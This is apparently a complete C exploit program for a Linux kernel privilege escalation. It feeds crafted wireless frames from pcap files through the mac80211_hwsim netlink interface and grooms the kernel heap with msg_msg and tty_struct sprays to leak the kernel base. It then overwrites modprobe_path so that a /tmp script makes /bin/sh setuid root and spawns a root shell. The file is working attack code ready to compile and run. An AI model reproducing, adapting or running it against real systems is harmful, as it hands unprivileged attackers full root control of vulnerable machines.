/*
 *  gcc -o xpl xpl.c $(pkg-config --cflags --libs libnl-3.0 libnl-genl-3.0
 * libpcap)
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <fcntl.h>
#include <net/if.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/netlink.h>
#include <pcap/pcap.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define CHECK(call)                                        \
    do {                                                   \
        if (call) {                                        \
            fprintf(stderr, "pcap failure: %s\n", errbuf); \
            return 2;                                      \
        }                                                  \
    } while (0)
/* mac8011_hwsim macros */
#define HWSIM_CMD_REGISTER 1
#define HWSIM_CMD_FRAME 2
#define HWSIM_ATTR_ADDR_RECEIVER 1
#define HWSIM_ATTR_FRAME 3
#define HWSIM_ATTR_RX_RATE 5
#define HWSIM_ATTR_SIGNAL 6
/* msg_msg macros */
#define HEADER_SZ 0x30
#define MTEXT_STAGE1_SIZE 0x400
#define MTEXT_STAGE2_SIZE 0x80
#define MSIZE MTEXT_STAGE1_SIZE - HEADER_SZ
#define MSG_COPY 040000
#define SHELL "/bin/sh"
#define DO_MODPROBE_OVERWRITE 2

#define TTY_SPRAY 15
#define LEAK_SIZE 0x2000

static int family;
int qid[8];

char* root_argv[] = { "-p", NULL };
char* modprobe_win = "/tmp/w\x00";
char* dummy_file = "/tmp/d\x00";
struct nl_sock* sk;

struct {
    long mtype;
    char mtext[MSIZE];
} msg;

void set_cpu_affinity()
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(getpid(), sizeof(cpu_set_t), &set);
}

void setup()
{
    int sockfd;
    struct ifreq ifr;
    int err, idx;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Can't open socket to reset adapters");
        exit(1);
    }

    sk = nl_socket_alloc();
    if (!sk) {
        printf("Failed to allocate socket");
        exit(1);
    }
    if (genl_connect(sk) < 0) {
        printf("Failed to connect socket");
        exit(1);
    }

    family = genl_ctrl_resolve(sk, "MAC80211_HWSIM");
    err = genl_send_simple(sk, family, HWSIM_CMD_REGISTER, 1, 0);
    if (err < 0) {
        printf("Error while registering: %s\n", nl_geterror(err));
        exit(1);
    }

    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "wlan0", IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);

    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "hwsim0", IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);
}

void send_msg(int qid,
    int size,
    int c,
    int type,
    int do_modprobe_overwrite,
    char* s)
{
    struct {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = type;
    if (do_modprobe_overwrite) {
        memcpy(msg.mtext, s, 6);
    } else {
        memset(msg.mtext, c, sizeof(msg.mtext));
    }

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1) {
        perror("msgsnd");
        exit(1);
    }
}

void* recv_msg(int qid, size_t size, int type, int flags)
{
    void* memdump = malloc(size);
    int r = -1;
	r = msgrcv(qid, memdump, size, type, flags);
	if (r == -1 || r != LEAK_SIZE) {
		return NULL;
	} 
	printf("[*] Received %d bytes!\n", r);
	return memdump;
}

void spray_msg_objs(int size, int n, int type)
{
    struct {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = 1;
    int mqids[n];
    memset(msg.mtext, 0x21, sizeof(msg.mtext));
    for (int i = 0; i < n; i++) {
        mqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msgsnd(mqids[i], &msg, sizeof(msg.mtext), 0) != 0)
            printf("[*] Error with msgsnd %d in spray_msg_objs\n", mqids[i]);
    }
}

static void handle_pkt(u_char* user,
    const struct pcap_pkthdr* h,
    const u_char* bytes)
{
    struct nl_msg* msg = nlmsg_alloc_simple(10, 0);
    struct nl_sock* sk = (void*)user;
    int err;
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family, 0, 0, HWSIM_CMD_FRAME, 1);
    nla_put(msg, HWSIM_ATTR_ADDR_RECEIVER, 6, "\x42\x00\x00\x00\x00\x00");
    nla_put_u32(msg, HWSIM_ATTR_RX_RATE, 0);
    nla_put_u32(msg, HWSIM_ATTR_SIGNAL, -60);
    nla_put(msg, HWSIM_ATTR_FRAME, h->caplen, bytes);
    err = nl_send_auto(sk, msg);
    if (err < 0)
        printf("Can't send msg: %s\n", nl_geterror(err));
}

int make_queue()
{
    int id = -1;
    if ((id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    return id;
}

void prepare_second_payload_modprobe(unsigned long modprobe_leak,
    char* pcap_file)
{
    FILE* fp;
    char* buffer;
    long file_size;

    fp = fopen(pcap_file, "rw");

    if (fp == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    rewind(fp);

    buffer = (char*)malloc((file_size + 1) * sizeof(char));
    if (buffer == NULL) {
        printf("Error allocating memory!\n");
        exit(1);
    }
    fread(buffer, sizeof(char), file_size, fp);
    buffer[file_size] = '\0';

    fclose(fp);
    int start_offset = 0x4a2;
    int end_offset = 0x6fa;
    for (int i = start_offset; i < end_offset; i += 8) {
        for (int j = 0; j < 8; j++) {
            buffer[i + j] = (modprobe_leak >> (8 * j)) & 0xff;
        }
    }
    fp = fopen(pcap_file, "wb");
    if (fp == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fwrite(buffer, 1, file_size, fp);
    fclose(fp);
}

unsigned long search_for_kaddr_leak(char* buff, unsigned long size)
{
    for (int i = 0; i < size / 8; i++) {
        unsigned long ptr = ((unsigned long*)(buff))[i];
        // printf("[*] ptr: 0x%016lx\n", ptr);
        unsigned long kbase = 0;
        kbase = ptr - 0x106f960;
        int check = (kbase & 0xFFFF0000000FFFFF) == 0xFFFF000000000000;
        if (check) {
            printf("[+] Found base: 0x%016lx\n", kbase);
            return kbase;
        }
    }
    return 0;
}

unsigned long search_for_heap_leak(char* buff, unsigned long size)
{
    for (int i = 0; i < size / 8; i++) {
        unsigned long ptr = ((unsigned long*)(buff))[i];
        int check = (ptr & 0xFFFF000000000000) == 0xFFFF000000000000;
        if (check) {
            printf("[*] Found heap leak: 0x%016lx\n", ptr);
            return ptr;
        }
    }
    return 0;
}

void modprobe_init()
{
    int fd = open(dummy_file, O_RDWR | O_CREAT);

    if (fd < 0) {
        perror("[*] dummy_file creation failed");
        exit(-1);
    }

    char bad_magic[] = "\xff\xff\xff\xff";
    write(fd, bad_magic, sizeof(bad_magic));
    close(fd);

    char w[] = "#!/bin/sh\nchmod 4755 " SHELL "\n && chown root:root " SHELL
               "\n && chmod u+s " SHELL "\n";

    if (chmod(dummy_file, 0777) < 0) {
        puts("[!] Failed to chmod dummy_file");
        exit(-1);
    };

    fd = open(modprobe_win, O_RDWR | O_CREAT);
    if (fd < 0) {
        perror("[*] modprobe_win creation failed");
        exit(-1);
    }

    write(fd, w, sizeof(w));
    close(fd);

    if (chmod(modprobe_win, 0777) < 0) {
        puts("[!] Failed to chmod modprobe_win");
        exit(-1);
    };

    return;
}

void trigger_modprobe()
{
    puts("[*] Triggering modprobe via dummy file");
    execve(dummy_file, NULL, NULL);
    return;
}

int main(int argc, char** argv)
{
    printf("[*] Initial setup\n");
    set_cpu_affinity();
    setup();
    modprobe_init();

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <pcap1> <pcap2> \n", argv[0]);
        return 2;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    CHECK(pcap_init(1, errbuf));

    int n = 4;
    int stage_one_msg_type = 1;
    unsigned long heap_addr = 0;
    int ttyids[TTY_SPRAY];
    unsigned long kaddr = 0;

    printf("[*] Spraying kmalloc-1k msg objects\n");
    spray_msg_objs(MTEXT_STAGE1_SIZE, 8, stage_one_msg_type);

    qid[0] = make_queue();
    qid[1] = make_queue();

    for (int i = 0; i < n; i++) {
        send_msg(qid[0], MTEXT_STAGE1_SIZE, 0x30 + i, i + 1, 0, 0);
    }

    printf("[*] Create hole at msg ID #4\n");
    recv_msg(qid[0], MTEXT_STAGE1_SIZE, 2, IPC_NOWAIT | MSG_NOERROR);

    printf("[*] Sending packet #1\n");
    pcap_t* input = pcap_open_offline(argv[1], errbuf);
    int r = pcap_loop(input, 2, handle_pkt, (void*)sk);

    if (r == 0) {
        printf("[*] Spraying tty_structs\n");
        for (int i = 0; i < TTY_SPRAY; i++) {
            if (ttyids[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY) < 0) {
                perror("ptmx");
                exit(-1);
            }
        }
        printf("[*] Checking for leak\n");
        for (int i = 0; i < n; i++) {
            char* leak = recv_msg(qid[0], LEAK_SIZE, 1, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
            if (leak != NULL) {
                kaddr = search_for_kaddr_leak(leak, LEAK_SIZE);
                // heap_addr = search_for_heap_leak(leak, LEAK_SIZE);
                memset(leak, 0x0, LEAK_SIZE);
                break;
            }
        }
    }

    if (kaddr != 0) {
        printf("[*] Kernel base: 0x%016lx\n", kaddr);
        /*
            freelist poisoning -> modprobe_path AAW
    	*/
        unsigned long modprobe_path = (kaddr + 0x164f9e0) - 0x30;
        prepare_second_payload_modprobe(modprobe_path, argv[2]);

        int stage_two_msg_type = 4141;

        spray_msg_objs(MTEXT_STAGE2_SIZE, 80, stage_two_msg_type);

        printf("[*] Sending packet #2\n");
        pcap_t* input2 = pcap_open_offline(argv[2], errbuf);
        int r2 = pcap_loop(input2, 2, handle_pkt, (void*)sk);

        if (r2 == 0) {
            printf("[*] Spraying messages for each queue\n");
            for (int i = 0; i < 80; i++) {
                send_msg(qid[1], MTEXT_STAGE2_SIZE, 0, stage_two_msg_type,
                    DO_MODPROBE_OVERWRITE, modprobe_win);
            }
            trigger_modprobe();
            struct stat check;
            if (stat(SHELL, &check) < 0) {
                perror("[-] Error on checking /bin/dash permissions");
                exit(-1);
            }
            if (check.st_mode & S_ISUID) {
                printf("[*] We are root\n");
                execve(SHELL, root_argv, NULL);
            }
        }
    }
}